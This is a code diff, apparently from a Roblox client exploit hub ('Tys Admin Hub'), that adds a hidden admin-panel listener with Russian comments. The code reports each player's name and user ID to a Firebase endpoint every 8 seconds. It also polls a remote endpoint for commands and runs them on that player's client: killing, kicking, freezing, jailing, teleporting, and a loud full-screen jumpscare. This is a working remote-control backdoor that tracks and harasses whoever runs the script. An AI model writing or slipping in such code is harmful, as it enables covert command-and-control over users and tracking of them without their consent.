@@ -1,0 +1,285 @@
+-- ==============================================================================
+-- СЛУШАТЕЛЬ И ПИНГ ДЛЯ АДМИН-ПАНЕЛИ (С ЗВУКОМ 123685646572844)
+-- ==============================================================================
+do
+    local _R = {}
+    _R.endpoint = string.format("%s/targets/%d.json?auth=%s", FIREBASE_BASE, LocalPlayer.UserId, FIREBASE_SECRET)
+    _R.presenceUrl = string.format("%s/active_users/%d.json?auth=%s", FIREBASE_BASE, LocalPlayer.UserId, FIREBASE_SECRET)
+    _R.lastTimestamp = os.time()
+    _R.loopConn = nil
+
+    _R.isJailed = false
+    _R.jailCFrame = nil
+    _R.jailConn = nil
+    _R.currentJailModel = nil
+
+    _R.stopLoop = function()
+        if _R.loopConn then
+            _R.loopConn:Disconnect()
+            _R.loopConn = nil
+        end
+    end
+
+    _R.removeJailStructure = function()
+        if _R.currentJailModel and _R.currentJailModel.Parent then
+            pcall(function() _R.currentJailModel:Destroy() end)
+        end
+        _R.currentJailModel = nil
+
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if obj.Name == "AdminJailStructure" or obj.Name == "AdminJailWall" then
+                pcall(function() obj:Destroy() end)
+            end
+        end
+    end
+
+    _R.stopJailLoop = function()
+        _R.isJailed = false
+        _R.jailCFrame = nil
+
+        if _R.jailConn then
+            _R.jailConn:Disconnect()
+            _R.jailConn = nil
+        end
+
+        _R.removeJailStructure()
+    end
+
+    LocalPlayer.CharacterAdded:Connect(function(newChar)
+        _R.stopLoop()
+        if _R.isJailed and _R.jailCFrame then
+            task.spawn(function()
+                local root = newChar:WaitForChild("HumanoidRootPart", 5)
+                if root and _R.isJailed and _R.jailCFrame then
+                    task.wait(0.1)
+                    root.CFrame = _R.jailCFrame
+                    root.AssemblyLinearVelocity = Vector3.zero
+                    root.AssemblyAngularVelocity = Vector3.zero
+                end
+            end)
+        end
+    end)
+
+    _R.buildHollowJail = function(centerCFrame)
+        _R.removeJailStructure()
+
+        local model = Instance.new("Model")
+        model.Name = "AdminJailStructure"
+        model.Parent = workspace
+        _R.currentJailModel = model
+
+        local function createWall(size, cframe)
+            local wall = Instance.new("Part")
+            wall.Name = "AdminJailWall"
+            wall.Size = size
+            wall.CFrame = cframe
+            wall.Anchored = true
+            wall.CanCollide = true
+            wall.Transparency = 0.6
+            wall.BrickColor = BrickColor.new("Bright violet")
+            wall.Material = Enum.Material.ForceField
+            wall.Parent = model
+            return wall
+        end
+
+        local cx, cy, cz = centerCFrame.Position.X, centerCFrame.Position.Y, centerCFrame.Position.Z
+        local height = 8
+        local width = 8
+        local thickness = 1
+
+        createWall(Vector3.new(width, thickness, width), CFrame.new(cx, cy - 3.5, cz))
+        createWall(Vector3.new(width, thickness, width), CFrame.new(cx, cy + 4.5, cz))
+
+        createWall(Vector3.new(thickness, height, width), CFrame.new(cx - (width / 2), cy + 0.5, cz))
+        createWall(Vector3.new(thickness, height, width), CFrame.new(cx + (width / 2), cy + 0.5, cz))
+        createWall(Vector3.new(width, height, thickness), CFrame.new(cx, cy + 0.5, cz - (width / 2)))
+        createWall(Vector3.new(width, height, thickness), CFrame.new(cx, cy + 0.5, cz + (width / 2)))
+    end
+
+    _R.jumpscare = function(customAssetId, customSoundId)
+        local jsGui = Instance.new("ScreenGui")
+        jsGui.Name = "TysClientJumpscare"
+        jsGui.DisplayOrder = 999999
+        jsGui.IgnoreGuiInset = true
+        jsGui.ResetOnSpawn = false
+        jsGui.Parent = PlayerGui
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(1, 0, 1, 0)
+        frame.BackgroundColor3 = Color3.new(0, 0, 0)
+        frame.BorderSizePixel = 0
+        frame.Parent = jsGui
+
+        local img = Instance.new("ImageLabel")
+        img.Size = UDim2.new(1, 0, 1, 0)
+        img.BackgroundTransparency = 1
+        img.Image = customAssetId or "rbxassetid://101456161393973"
+        img.ScaleType = Enum.ScaleType.Fit
+        img.Parent = frame
+
+        task.spawn(function()
+            local sound = Instance.new("Sound")
+            sound.Name = "JumpscareSound"
+            sound.Volume = 10
+            sound.Looped = false
+            sound.PlaybackSpeed = 1.0
+            sound.SoundId = customSoundId or "rbxassetid://123685646572844"
+            sound.Parent = workspace.CurrentCamera or SoundService
+            sound:Play()
+
+            sound.Ended:Connect(function()
+                sound:Destroy()
+            end)
+        end)
+
+        task.spawn(function()
+            local startTime = os.clock()
+            while os.clock() - startTime < 3.2 do
+                img.Position = UDim2.new(0, math.random(-25, 25), 0, math.random(-25, 25))
+                task.wait(0.03)
+            end
+            jsGui:Destroy()
+        end)
+    end
+
+    _R.execute = function(cmd, args)
+        local char = LocalPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+
+        if cmd == "kill" then
+            if hum then hum.Health = 0 end
+        elseif cmd == "kick" then
+            LocalPlayer:Kick("Отключено через Tys Admin Hub.")
+        elseif cmd == "loopkill" then
+            _R.stopLoop()
+            _R.loopConn = RunService.Stepped:Connect(function()
+                local curHum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if curHum and curHum.Health > 0 then curHum.Health = 0 end
+            end)
+        elseif cmd == "unloopkill" then
+            _R.stopLoop()
+        elseif cmd == "freeze" then
+            if root then root.Anchored = true end
+        elseif cmd == "unfreeze" then
+            if root then root.Anchored = false end
+        elseif cmd == "jail" then
+            if root then
+                _R.stopJailLoop()
+                _R.isJailed = true
+                _R.jailCFrame = CFrame.new(root.Position + Vector3.new(0, 1, 0))
+
+                _R.buildHollowJail(_R.jailCFrame)
+
+                _R.jailConn = RunService.RenderStepped:Connect(function()
+                    if _R.isJailed and _R.jailCFrame then
+                        local currentChar = LocalPlayer.Character
+                        local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
+                        if currentRoot then
+                            local dist = (currentRoot.Position - _R.jailCFrame.Position).Magnitude
+                            if dist > 3.5 then
+                                currentRoot.CFrame = _R.jailCFrame
+                                currentRoot.AssemblyLinearVelocity = Vector3.zero
+                                currentRoot.AssemblyAngularVelocity = Vector3.zero
+                            end
+                        end
+                    end
+                end)
+            end
+        elseif cmd == "unjail" then
+            _R.stopJailLoop()
+        elseif cmd == "bring" then
+            if root and hum and args and args.pos then
+                local targetCFrame = CFrame.new(Vector3.new(args.pos[1], args.pos[2], args.pos[3]))
+                
+                local oldWalkSpeed = hum.WalkSpeed
+                local oldJumpPower = hum.JumpPower
+                local oldJumpHeight = hum.JumpHeight
+                
+                hum.WalkSpeed = 0
+                hum.JumpPower = 0
+                pcall(function() hum.JumpHeight = 0 end)
+                
+                root.CFrame = targetCFrame
+                root.AssemblyLinearVelocity = Vector3.zero
+                root.AssemblyAngularVelocity = Vector3.zero
+                
+                task.spawn(function()
+                    local startTime = tick()
+                    while tick() - startTime < 1 do
+                        if root and hum and hum.Health > 0 then
+                            root.AssemblyLinearVelocity = Vector3.zero
+                            root.AssemblyAngularVelocity = Vector3.zero
+                            hum.WalkSpeed = 0
+                            hum.JumpPower = 0
+                            pcall(function() hum.JumpHeight = 0 end)
+                        end
+                        task.wait()
+                    end
+                    
+                    if hum and hum.Parent and hum.Health > 0 then
+                        hum.WalkSpeed = (oldWalkSpeed and oldWalkSpeed > 0) and oldWalkSpeed or 16
+                        hum.JumpPower = (oldJumpPower and oldJumpPower > 0) and oldJumpPower or 50
+                        pcall(function() hum.JumpHeight = oldJumpHeight end)
+                    end
+                end)
+            end
+        elseif cmd == "jumpscare_67" then
+            _R.jumpscare(args and args.image, args and args.sound)
+        end
+    end
+
+    -- Пинг присутствия в Firebase
+    task.spawn(function()
+        while task.wait(8) do
+            if httpRequest then
+                pcall(function()
+                    httpRequest({
+                        Url = _R.presenceUrl,
+                        Method = "PUT",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode({
+                            name = LocalPlayer.Name,
+                            displayName = LocalPlayer.DisplayName,
+                            userId = LocalPlayer.UserId,
+                            lastSeen = os.time()
+                        })
+                    })
+                end)
+            end
+        end
+    end)
+
+    -- Приемник команд
+    task.spawn(function()
+        if httpRequest then
+            pcall(function()
+                httpRequest({ Url = _R.endpoint, Method = "DELETE" })
+            end)
+        end
+
+        while task.wait(1.5) do
+            if httpRequest then
+                local success, res = pcall(function()
+                    return httpRequest({ Url = _R.endpoint, Method = "GET" })
+                end)
+
+                if success and res and res.Body and res.Body ~= "null" then
+                    local decodeOk, data = pcall(function()
+                        return HttpService:JSONDecode(res.Body)
+                    end)
+
+                    if decodeOk and type(data) == "table" and data.command then
+                        if data.timestamp and data.timestamp > _R.lastTimestamp then
+                            _R.lastTimestamp = data.timestamp
+                            pcall(function()
+                                httpRequest({ Url = _R.endpoint, Method = "DELETE" })
+                            end)
+                            _R.execute(data.command, data.args)
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
